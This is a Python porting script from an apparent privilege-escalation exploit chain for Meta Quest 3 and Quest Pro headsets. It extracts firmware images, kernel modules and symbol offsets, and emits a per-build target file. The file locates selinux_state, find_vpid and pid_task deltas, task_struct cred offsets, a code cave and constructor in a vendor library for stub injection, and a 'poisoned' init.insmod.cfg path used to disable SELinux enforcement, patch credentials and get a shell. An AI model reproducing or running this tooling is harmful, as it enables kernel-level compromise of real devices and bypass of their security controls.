#!/usr/bin/env python3
# port.py — gather everything needed for a new firmware target and emit targets/<name>.json.
#
#   Quest 3 (two-carrier):  python3 port.py --zip q3_<build>.zip   --name quest3-<short> [--device S]
#   Quest Pro (merged):     python3 port.py --zip QPro_<build>.zip --name questpro-<short> --merged \
#                             --carrier rdbg --inject-lib libgralloc.qti.so --enforcing-off 1 \
#                             --cred-off 0x7e8 [--device S]
#
# One emitter, both device families. --merged builds the single-carrier shape (rdbg diff-patched by
# build_credmod into enforcing=0 + status-sync + cred-patch, cfg poisoned shell-direct). Non-merged
# builds the Q3 two-carrier shape (llcc_perfmon enforcing carrier + usbip-vudc cred carrier).
# enforcing-off/cred-off are the 4.19-vs-5.10 struct deltas (default to Q3 5.10: 0 / 0x778); confirm
# them from the device's /sys/kernel/btf/vmlinux (selinux_state.enforcing, task_struct.cred).
# Needs: payload-dumper-go, debugfs, vmlinux-to-elf, llvm-readelf/nm.
import argparse, json, os, re, struct, subprocess, sys, tempfile, shutil, atexit
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from toolconf import READELF, NM, PDG, DEBUGFS, VMLINUX_TO_ELF   # central tool locations (edit toolconf.py / set env)
R_AARCH64_CALL26 = 0x11b

def sh(c): return subprocess.run(c, shell=True, capture_output=True, text=True).stdout
def die(m): print("ERROR:", m); sys.exit(1)

def dump_partitions(zippath, workdir, parts):
    sh(f"cd {workdir} && unzip -o {zippath} payload.bin >/dev/null 2>&1")
    subprocess.run([PDG, "-p", ",".join(parts), "-o", workdir,
                    os.path.join(workdir, "payload.bin")], capture_output=True)

def debugfs_dump(img, inner, outp):
    subprocess.run([DEBUGFS, "-R", f"dump {inner} {outp}", img], capture_output=True)
    return os.path.exists(outp) and os.path.getsize(outp) > 0

def carrier_anchor_symbol(ko):
    # the CALL26 target inside .rela.init.text (this is what build_carrier repoints to 0x14,
    # so DELTA must be selinux_state - <this symbol>). Ignore CALL26s in other sections (CFI etc).
    out = sh(f"{READELF} -r {ko}")
    for blk in ("Relocation section '" + s for s in out.split("Relocation section '")[1:]):
        if blk.startswith("Relocation section '.rela.init.text'"):
            m = re.search(r"CALL26\s+\S+\s+(\S+)", blk)
            return m.group(1).split("+")[0].strip() if m else None
    return None

def lib_from_device_or_zip(name, devpath, dev, workdir, part_imgs, inners):
    # devpath = on-device path (adb pull, binary-safe); part_imgs/inners = fallback (image, inner-path)
    local = os.path.join(workdir, name)
    if dev:
        subprocess.run(["adb", "-s", dev, "pull", devpath, local], capture_output=True)
        if os.path.exists(local) and os.path.getsize(local) > 1000: return local
    for img, inner in zip(part_imgs, inners):
        if debugfs_dump(img, inner, local): return local
    return local if os.path.exists(local) and os.path.getsize(local) > 1000 else None

def find_module(workdir, name, imgs):
    # QPro keeps modules in vendor.img:/lib/modules; Q3 in vendor_dlkm.img:/lib/modules — try both.
    out = os.path.join(workdir, name + ".ko")
    for img in imgs:
        if debugfs_dump(os.path.join(workdir, img), f"/lib/modules/{name}.ko", out): return out
    return None

def init_array_and_ctor(libeva):
    d = open(libeva, "rb").read()
    off = None
    for l in sh(f"{READELF} -S {libeva}").splitlines():
        if ".init_array" in l:
            off = int(l.split()[4], 16); break
    if off is None: die("no .init_array in libeva")
    ctor = struct.unpack_from("<Q", d, off)[0]
    return off, ctor

def find_gap(libeva, need=1720):
    d = open(libeva, "rb").read()
    # scan executable PT_LOAD segments for the largest zero run
    e_phoff, = struct.unpack_from("<Q", d, 0x20)
    phentsz, phnum = struct.unpack_from("<HH", d, 0x36)
    best = (0, 0)
    for i in range(phnum):
        p = e_phoff + i * phentsz
        p_type, p_flags = struct.unpack_from("<II", d, p)
        p_off, = struct.unpack_from("<Q", d, p + 8)
        p_filesz, = struct.unpack_from("<Q", d, p + 32)
        if p_type != 1 or not (p_flags & 1): continue          # PT_LOAD + X
        seg = d[p_off:p_off + p_filesz]
        run = 0
        for j, b in enumerate(seg):
            if b == 0:
                run += 1
                if run > best[1]: best = (p_off + j - run + 1, run)
            else: run = 0
    start, size = best
    start = (start + 7) & ~7                                    # 8-byte align
    size -= (start - best[0])
    if size < need: die(f"no >= {need}B zero gap in an exec segment (largest {best[1]})")
    return start, size

def dump_sym(lib, needle):
    for l in sh(f"{READELF} -sW {lib}").splitlines():
        if needle in l:
            f = l.split(); return int(f[1], 16), int(f[2])
    return None, None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--zip", required=True); ap.add_argument("--name", required=True)
    ap.add_argument("--device"); ap.add_argument("--anchor", default="__platform_driver_register")
    ap.add_argument("--merged", action="store_true",
                    help="single-carrier shape (Quest Pro): one module does enforcing=0+cred-patch")
    ap.add_argument("--carrier", default="llcc_perfmon",
                    help="enforcing/merged carrier module name (merged: rdbg)")
    ap.add_argument("--cred-carrier", default="usbip-vudc",
                    help="Q3 only: not-loaded cred carrier (merged reuses --carrier)")
    ap.add_argument("--inject-lib", default="libeva.so",
                    help="trackingservice-mapped same_process_hal_file lib holding the ctor stub "
                         "(Q3: libeva.so; QPro: libgralloc.qti.so)")
    ap.add_argument("--enforcing-off", type=lambda x: int(x, 0), default=0,
                    help="selinux_state.enforcing byte offset (5.10=0, 4.19=1; confirm via BTF)")
    ap.add_argument("--cred-off", default="0x778",
                    help="task_struct->cred offset (5.10=0x778, 4.19=0x7e8; confirm via BTF)")
    a = ap.parse_args()
    a.zip = os.path.abspath(a.zip)   # dump_partitions cd's into workdir; zip path must be absolute
    tdir = os.path.join(HERE, "targets", a.name); os.makedirs(tdir, exist_ok=True)
    scratch = os.path.join(HERE, "build"); os.makedirs(scratch, exist_ok=True)   # on disk, not tmpfs
    wd = tempfile.mkdtemp(prefix="port_", dir=scratch)
    atexit.register(lambda: shutil.rmtree(wd, ignore_errors=True))               # 1.4GB payload etc.
    print(f"[*] work dir {wd} (auto-removed on exit)   merged={a.merged}")

    print("[*] dumping boot, vendor, vendor_dlkm, system ...")
    dump_partitions(a.zip, wd, ["boot", "vendor", "vendor_dlkm", "system"])
    IMGS = ["vendor.img", "vendor_dlkm.img"]           # QPro: vendor; Q3: vendor_dlkm — try both

    print(f"[*] extracting carrier ({a.carrier}) + cfg ...")
    ko = find_module(wd, a.carrier, IMGS)
    if not ko: die(f"carrier {a.carrier}.ko not found in vendor/vendor_dlkm")
    shutil.copy(ko, os.path.join(tdir, f"{a.carrier}.ko")); ko = os.path.join(tdir, f"{a.carrier}.ko")
    cfg = os.path.join(tdir, "init.insmod.cfg")
    if not (debugfs_dump(os.path.join(wd, "vendor.img"), "/etc/init.insmod.cfg", cfg)
            or debugfs_dump(os.path.join(wd, "vendor_dlkm.img"), "/etc/init.insmod.cfg", cfg)):
        die("init.insmod.cfg not found")
    vermagic = re.search(r"vermagic=(\S+)", sh(f"strings -a {ko}")).group(1)
    anchor = a.anchor
    # the carrier's init must call the anchor (build_credmod/build_carrier repoint that CALL26).
    car_relas = sh(f"{READELF} -r {ko}").split("rela.init.text", 1)[-1].split("Relocation section", 1)[0]
    if anchor not in car_relas:
        print(f"[!] carrier init has no {anchor} CALL26 — pick --anchor from its .rela.init.text")
    print(f"    carrier vermagic={vermagic}  anchor={anchor}")

    credko = None
    if not a.merged:
        credko = find_module(wd, a.cred_carrier, IMGS)
        if not credko: die(f"cred carrier {a.cred_carrier}.ko not found")
        shutil.copy(credko, os.path.join(tdir, f"{a.cred_carrier}.ko"))
        cred_relas = sh(f"{READELF} -r {credko}").split("rela.init.text", 1)[-1].split("Relocation section", 1)[0]
        if anchor not in cred_relas:
            print(f"[!] cred carrier init has no {anchor} CALL26 — build_credmod will fail")

    print("[*] vmlinux-to-elf (deltas: selinux_state, find_vpid, pid_task, ssuse) ...")
    vm = os.path.join(wd, "vmlinux.elf")
    subprocess.run([VMLINUX_TO_ELF, os.path.join(wd, "boot.img"), vm], capture_output=True)
    want = ("selinux_state", anchor, "find_vpid", "pid_task", "selinux_status_update_setenforce")
    syms = {}
    for l in sh(f"{NM} {vm}").splitlines():
        f = l.split()
        if len(f) == 3 and f[2] in want: syms[f[2]] = int(f[0], 16)
    miss = [s for s in want if s not in syms]
    if miss: die("missing kernel symbols in vmlinux: " + ",".join(miss))
    pdr = syms[anchor]
    d32 = lambda s: hex((syms[s] - pdr) & 0xffffffff)     # anchor-relative, 32-bit two's complement
    print(f"    {anchor}={pdr:#x} selinux_state={syms['selinux_state']:#x}")
    print(f"    dsel={d32('selinux_state')} dfv={d32('find_vpid')} dpt={d32('pid_task')} "
          f"dssuse={d32('selinux_status_update_setenforce')}")

    print(f"[*] inject-lib ({a.inject_lib}) / libandroid offsets ...")
    ilib = lib_from_device_or_zip(a.inject_lib, f"/vendor/lib64/{a.inject_lib}", a.device, wd,
                                  [os.path.join(wd, i) for i in IMGS], [f"/lib64/{a.inject_lib}"] * 2)
    libas = lib_from_device_or_zip("libandroid_servers.so", "/system/lib64/libandroid_servers.so",
                                   a.device, wd, [os.path.join(wd, "system.img")], ["/lib64/libandroid_servers.so"])
    if not ilib: die(f"could not obtain {a.inject_lib} (connect --device, or it's not in vendor)")
    if not libas: die("could not obtain libandroid_servers (connect --device — it lives in system, not dumped here)")
    ia_off, ctor = init_array_and_ctor(ilib)
    gap_off, gap_sz = find_gap(ilib)
    dump_off, dump_sz = dump_sym(libas, "NativeInputManager4dumpE")

    build = subprocess.run(["adb", "-s", a.device, "shell", "getprop", "ro.build.version.incremental"],
                           capture_output=True, text=True).stdout.strip() if a.device else "UNKNOWN-set-me"
    kernel = {"anchor_symbol": anchor, "enforcing_off": a.enforcing_off,
              "cred_off": a.cred_off, "merged": a.merged,
              "delta_selinux_from_anchor": d32("selinux_state"),
              "delta_findvpid_from_anchor": d32("find_vpid"),
              "delta_pidtask_from_anchor": d32("pid_task"),
              "delta_ssuse_from_anchor": d32("selinux_status_update_setenforce")}
    tgt = {
        "name": a.name,
        "description": f"build {build}, kernel {vermagic}" + (" (MERGED single-carrier)" if a.merged else ""),
        "device": {"build_incremental": build, "vermagic": vermagic},
        "dirtyfrag": {"sa_spi": "0xdeadbe10", "writer_spi": "0xdeadbe11", "keymat_base": "0x41"},
        "kernel": kernel,
        "carrier": {"device_path": f"/vendor/lib/modules/{a.carrier}.ko",
                    "local_ko": f"{a.name}/{a.carrier}.ko", "anchor_reloc_off": "0x14"},
        "inject_lib": {"device_path": f"/vendor/lib64/{a.inject_lib}", "init_array_off": hex(ia_off),
                       "orig_ctor_off": hex(ctor), "stub_gap_off": hex(gap_off), "stub_gap_size": gap_sz},
        "libandroid_servers": {"device_path": "/system/lib64/libandroid_servers.so",
                               "dump_off": hex(dump_off), "dump_size": dump_sz},
        "cfg": {"device_path": "/vendor/etc/init.insmod.cfg", "local_cfg": f"{a.name}/init.insmod.cfg",
                "inject_off": "0x21", "inject_len": 54,
                **({"shell_poison_under_enforcing": True} if a.merged else {})},
        "services": {"tracking": "trackingservice", "insmod_sh": "insmod_sh"},
        "property_socket": "/dev/socket/property_service",
    }
    if not a.merged:
        tgt["cred_carrier"] = {"device_path": f"/vendor/lib/modules/{a.cred_carrier}.ko",
                               "local_ko": f"{a.name}/{a.cred_carrier}.ko",
                               "note": f"not-loaded cred carrier; anchor {anchor}"}
    outp = os.path.join(HERE, "targets", a.name + ".json")
    json.dump(tgt, open(outp, "w"), indent=2)
    print(f"\n[+] wrote {outp}\n[+] assets in targets/{a.name}/")
    print(f"[!] VERIFY: enforcing_off={a.enforcing_off} cred_off={a.cred_off} against the device's "
          "/sys/kernel/btf/vmlinux (selinux_state.enforcing, task_struct.cred);")
    print("    cfg.inject_off/len span whole lines >17B before EOF; stub_gap is a zero run;",
          "offsets came from", "the device" if a.device else "the zip (pass --device for exact)")

if __name__ == "__main__":
    main()
